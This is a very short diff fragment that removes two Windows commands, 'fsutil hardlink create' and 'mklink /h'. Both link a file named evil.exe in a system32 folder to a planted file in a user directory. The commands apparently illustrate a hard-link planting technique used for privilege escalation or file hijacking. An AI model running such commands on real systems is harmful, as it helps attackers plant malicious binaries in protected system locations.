@@ -1,3 +1,0 @@
-fsutil hardlink create c:\windows\system32\fxstmp\evil.exe c:\myfolder\plantedfile.exe 
-
-mklink /h c:\windows\system32\fxstmp\evil.exe c:\myfolder\plantedfile.exe
